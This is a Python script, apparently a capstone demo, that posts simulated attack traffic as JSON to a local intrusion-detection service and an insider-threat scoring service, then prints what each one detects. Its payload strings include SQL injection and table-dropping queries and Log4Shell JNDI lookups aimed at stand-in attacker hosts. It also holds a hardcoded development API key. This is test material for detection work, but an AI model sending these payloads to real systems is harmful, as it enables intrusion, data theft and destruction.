#!/usr/bin/env python3
"""
CASOC Red-Team Penetration & Threat Simulator
Simulates realistic external cyber attacks and malicious insider threats against
the Cognitive Autonomous Security Operations Center (CASOC).

Targets:
- Port 5000: NIDS ML Inference, DPI Scanner & Active Defense Engine
- Port 5001: Insider Threat UEBA & Isolation Forest Engine
"""
import sys
import time
import json
import random
import urllib.request
import urllib.error
from datetime import datetime

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
if hasattr(sys.stderr, 'reconfigure'):
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')

import os
NIDS_PORT = os.environ.get("NIDS_PORT", "5005")
NIDS_URL = os.environ.get("NIDS_URL", f"http://localhost:{NIDS_PORT}/predict")
INSIDER_URL = "http://localhost:5001/api/ingest"
INSIDER_KEY = "dev-agent-key-change-in-production"


def log(msg, color="cyan"):
    colors = {
        "cyan": "\033[96m",
        "red": "\033[91m",
        "green": "\033[92m",
        "yellow": "\033[93m",
        "bold": "\033[1m",
        "reset": "\033[0m"
    }
    c = colors.get(color, "")
    r = colors["reset"]
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{c}[{timestamp}] {msg}{r}")

def send_nids_packets(packet_list, attack_name):
    log(f"⚡ Dispatching {attack_name} to CASOC NIDS ML Engine (Port 5000)...", "yellow")
    try:
        data = json.dumps(packet_list).encode('utf-8')
        req = urllib.request.Request(
            NIDS_URL,
            data=data,
            headers={'Content-Type': 'application/json'}
        )
        with urllib.request.urlopen(req, timeout=5) as res:
            result = json.loads(res.read().decode('utf-8'))
            log(f"✅ Prediction: {result.get('classification')} | Severity: {result.get('threat_severity')}", "green")
            log(f"   Category: {result.get('category')} (Confidence: {result.get('confidence')}%)", "cyan")
            if result.get('predicted_taxonomy'):
                log(f"   ML Taxonomy: {result.get('predicted_taxonomy')}", "cyan")
            log(f"   Mitigation Action: {result.get('action_taken')}", "red" if result.get('is_attack') else "green")
            return result
    except Exception as e:
        log(f"❌ Failed to reach NIDS Port 5000: {e}", "red")
        return None

def send_insider_event(payload, attack_name):
    log(f"👤 Dispatching {attack_name} to CASOC Insider Threat Engine (Port 5001)...", "yellow")
    try:
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(
            INSIDER_URL,
            data=data,
            headers={
                'Content-Type': 'application/json',
                'X-API-Key': INSIDER_KEY
            }
        )
        with urllib.request.urlopen(req, timeout=5) as res:
            result = json.loads(res.read().decode('utf-8'))
            log(f"✅ UEBA Result: Status={result.get('status')} | Anomaly={result.get('is_anomaly')}", "green")
            log(f"   Risk Score: {result.get('risk_score')} | Method: {result.get('detection_method')}", "cyan")
            log(f"   Keywords: {result.get('keywords_found')}", "red" if result.get('keywords_found') else "green")
            return result
    except Exception as e:
        log(f"❌ Failed to reach Insider Engine Port 5001: {e}", "red")
        return None

# ================= ATTACK SCENARIO GENERATORS =================

def attack_sqli():
    attacker_ip = f"185.220.{random.randint(100, 200)}.{random.randint(2, 254)}"
    t = datetime.now().isoformat()
    packets = [
        {
            "timestamp": t,
            "src_ip": attacker_ip,
            "dst_ip": "10.0.0.15",
            "src_port": 54321,
            "dst_port": 80,
            "protocol": "TCP",
            "payload": "GET /api/v1/auth/login?username=' OR '1'='1&pass=x HTTP/1.1"
        },
        {
            "timestamp": t,
            "src_ip": attacker_ip,
            "dst_ip": "10.0.0.15",
            "src_port": 54322,
            "dst_port": 80,
            "protocol": "TCP",
            "payload": "POST /query HTTP/1.1 UNION SELECT username, password_hash, token FROM staff_users;--"
        },
        {
            "timestamp": t,
            "src_ip": attacker_ip,
            "dst_ip": "10.0.0.15",
            "src_port": 54323,
            "dst_port": 80,
            "protocol": "TCP",
            "payload": "DROP TABLE audit_trail;--"
        },
        {
            "timestamp": t,
            "src_ip": attacker_ip,
            "dst_ip": "10.0.0.15",
            "src_port": 54324,
            "dst_port": 80,
            "protocol": "TCP",
            "payload": "SELECT * FROM credit_cards WHERE 1=1"
        }
    ]
    return send_nids_packets(packets, "SQL Injection & Database Exfiltration (DPI)")

def attack_ddos():
    attacker_ip = f"198.51.{random.randint(50, 99)}.{random.randint(2, 254)}"
    packets = []
    base_time = time.time()
    for i in range(5):
        pkt_time = datetime.fromtimestamp(base_time + (i * 0.0001)).isoformat()
        packets.append({
            "timestamp": pkt_time,
            "src_ip": attacker_ip,
            "dst_ip": "10.0.0.1",
            "src_port": random.randint(10000, 65000),
            "dst_port": 80,
            "protocol": "TCP",
            "payload": "SYN_FLOOD_VOLUMETRIC_PACKET_BURST"
        })
    return send_nids_packets(packets, "Distributed Denial of Service (DDoS Syn Flood)")

def attack_portscan():
    attacker_ip = f"194.26.{random.randint(10, 40)}.{random.randint(2, 254)}"
    ports = [21, 22, 23, 25, 80, 443, 445, 3389, 8080]
    random.shuffle(ports)
    packets = []
    base_time = time.time()
    for i, port in enumerate(ports[:5]):
        pkt_time = datetime.fromtimestamp(base_time + (i * 0.002)).isoformat()
        packets.append({
            "timestamp": pkt_time,
            "src_ip": attacker_ip,
            "dst_ip": "10.0.0.1",
            "src_port": 58000 + i,
            "dst_port": port,
            "protocol": "TCP",
            "payload": f"PORT_RECON_SCAN_PROBE_{port}"
        })
    return send_nids_packets(packets, "Aggressive Reconnaissance & Port Scan")

def attack_log4shell():
    attacker_ip = f"103.145.{random.randint(10, 50)}.{random.randint(2, 254)}"
    t = datetime.now().isoformat()
    packets = [
        {
            "timestamp": t,
            "src_ip": attacker_ip,
            "dst_ip": "10.0.0.8",
            "src_port": 49152,
            "dst_port": 8080,
            "protocol": "TCP",
            "payload": "${jndi:ldap://c2-listener.darknet:1389/ExploitPayload}"
        },
        {
            "timestamp": t,
            "src_ip": attacker_ip,
            "dst_ip": "10.0.0.8",
            "src_port": 49153,
            "dst_port": 8080,
            "protocol": "TCP",
            "payload": "User-Agent: ${jndi:rmi://103.145.10.5:1099/Object}"
        },
        {
            "timestamp": t,
            "src_ip": attacker_ip,
            "dst_ip": "10.0.0.8",
            "src_port": 49154,
            "dst_port": 8080,
            "protocol": "TCP",
            "payload": "X-Forwarded-For: ${jndi:dns://attacker.org/rce}"
        },
        {
            "timestamp": t,
            "src_ip": attacker_ip,
            "dst_ip": "10.0.0.8",
            "src_port": 49155,
            "dst_port": 8080,
            "protocol": "TCP",
            "payload": "RCE Exploit Trigger Verification"
        }
    ]
    return send_nids_packets(packets, "Log4Shell / JNDI Remote Code Execution (CVE-2021-44228)")

def attack_insider():
    users = ["ACM2278", "CMP2946", "MBG3183", "PLJ1771"]
    u = random.choice(users)
    payload = {
        "user": u,
        "event_type": "DEVICE",
        "activity": "Connect",
        "timestamp": datetime.now().isoformat(),
        "details": json.dumps({
            "pc": f"PC-{u[:3]}-SECURE-09",
            "activity": "Connect",
            "file_tree": "D:\\Classified\\Restricted_Customer_Vault.db",
            "keywords": "exfiltrate malware password leak dump breach confidential"
        })
    }
    return send_insider_event(payload, f"Malicious Insider Data Exfiltration ({u})")

def attack_benign():
    client_ip = f"192.168.1.{random.randint(10, 200)}"
    t = datetime.now().isoformat()
    packets = [
        {
            "timestamp": t,
            "src_ip": client_ip,
            "dst_ip": "10.0.0.1",
            "src_port": 50001,
            "dst_port": 443,
            "protocol": "TCP",
            "payload": "GET /static/styles.css HTTP/1.1"
        },
        {
            "timestamp": t,
            "src_ip": client_ip,
            "dst_ip": "10.0.0.1",
            "src_port": 50002,
            "dst_port": 443,
            "protocol": "TCP",
            "payload": "GET /favicon.ico HTTP/1.1"
        },
        {
            "timestamp": t,
            "src_ip": client_ip,
            "dst_ip": "10.0.0.1",
            "src_port": 50003,
            "dst_port": 443,
            "protocol": "TCP",
            "payload": "HTTP/1.1 200 OK Content-Length: 420"
        },
        {
            "timestamp": t,
            "src_ip": client_ip,
            "dst_ip": "10.0.0.1",
            "src_port": 50004,
            "dst_port": 443,
            "protocol": "TCP",
            "payload": "ACK Connection Established"
        }
    ]
    return send_nids_packets(packets, "Benign Routine Web Traffic")

def run_continuous_stream():
    log("🚀 Starting Continuous Telemetry Generator (Press Ctrl+C to stop)...", "cyan")
    log("   Watch your React dashboard at http://localhost:3000 update live in real-time!", "green")
    
    scenarios = [
        (attack_benign, 0.4),
        (attack_sqli, 0.2),
        (attack_ddos, 0.15),
        (attack_portscan, 0.15),
        (attack_log4shell, 0.05),
        (attack_insider, 0.05)
    ]
    
    try:
        count = 1
        while True:
            print(f"\n--- [Cycle #{count}] ---")
            r = random.random()
            cum = 0
            chosen = attack_benign
            for func, weight in scenarios:
                cum += weight
                if r <= cum:
                    chosen = func
                    break
            chosen()
            count += 1
            time.sleep(3)
    except KeyboardInterrupt:
        log("\n🛑 Continuous attack simulation stopped by user.", "yellow")

def main():
    print("""
========================================================================
   CASOC — Cognitive Autonomous Security Operations Center
   Red-Team Penetration Testing & Real Attack Generator
========================================================================
   Target 1: NIDS LightGBM & DPI Engine   --> http://localhost:5000
   Target 2: Insider Threat UEBA Engine    --> http://localhost:5001
   Frontend: Live React Telemetry Display  --> http://localhost:3000
========================================================================
""")
    if len(sys.argv) > 1:
        arg = sys.argv[1].lower().strip('-')
        if 'sqli' in arg:
            attack_sqli()
        elif 'ddos' in arg:
            attack_ddos()
        elif 'scan' in arg:
            attack_portscan()
        elif 'rce' in arg or 'log4' in arg:
            attack_log4shell()
        elif 'insider' in arg:
            attack_insider()
        elif 'stream' in arg:
            run_continuous_stream()
        else:
            attack_sqli()
        return

    while True:
        print("Choose an attack scenario to showcase to your faculty:\n")
        print("  1. ⚡ SQL Injection & Database Exfiltration (DPI CRITICAL)")
        print("  2. ⚡ DDoS Volumetric Syn Flood (LightGBM Volumetric Anomaly)")
        print("  3. 🔍 Reconnaissance Port Scan (TCP Multi-port Probe)")
        print("  4. 💥 Log4Shell Remote Code Execution (JNDI LDAP Injection)")
        print("  5. 👤 Insider Threat: Restricted Data Exfiltration via Device")
        print("  6. 🌐 Benign Routine Traffic (Normal Flow)")
        print("  7. 🚀 Run Continuous Live Stream (Attacks + Normal every 3s)")
        print("  0. Exit\n")
        
        choice = input("Enter choice (0-7): ").strip()
        print()
        if choice == '1':
            attack_sqli()
        elif choice == '2':
            attack_ddos()
        elif choice == '3':
            attack_portscan()
        elif choice == '4':
            attack_log4shell()
        elif choice == '5':
            attack_insider()
        elif choice == '6':
            attack_benign()
        elif choice == '7':
            run_continuous_stream()
        elif choice == '0':
            print("Exiting simulator. Happy capstone demo!")
            break
        else:
            print("Invalid selection.")
        print("-" * 60)

if __name__ == '__main__':
    main()
